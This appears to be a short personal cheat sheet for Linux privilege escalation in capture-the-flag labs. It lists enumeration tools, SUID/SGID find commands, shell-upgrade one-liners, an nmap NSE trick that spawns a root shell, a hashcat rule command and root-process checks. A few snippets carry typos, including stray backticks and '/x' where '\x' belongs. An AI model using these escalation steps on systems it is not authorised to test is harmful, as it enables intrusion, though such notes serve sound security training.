# privilege escalation

## tools

- [LinEnum](https://github.com/rebootuser/LinEnum)
- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
- [thief](https://github.com/montyonsecurity/thief)

## password cracking

### rules

    hashcat -r /usr/share/hashcat/rules/best64.rule --stdout sorted-passes.lst | strings | sort -u > best64-passes.lst

## binaries

### suid

    find / $(pwd) -perm /4000 2> /dev/null

### sgid

    find / $(pwd) -perm /2000 2> /dev/null

### both

    find / $(pwd) -perm /6000 2> /dev/null

### gdb basics

TryHackMe's The Cod Caper showcases some basic gdb usage

### little endian

converting hex to little endian syntax

hex = 0x080484cb
little endian = /xcb/x84/x04/x08

## get bash

    /bin/bash -i`
    python -c 'import pty;pty.spawn("/bin/bash")'`

## exploiting nmap

Nmap scripts are written in Lua and you can pass Lua code to the NSE directly
    
    nmap --script <(echo 'os.execute("/bin/sh")')

## processes running as root

    ps -U root

## processes running as root (verbose)

    ps aux | grep root

## users who can sudo

    cat /etc/group | grep sudo

## login info

    cat /etc/login.defs | grep -v \# | grep [a-zA-Z0-9]
 
## sql

### find plugins folder (ran with what pirvilige sql has)

    select @@plugin\_dir;

### Find varibale value in sql

    select @@variable\_name;
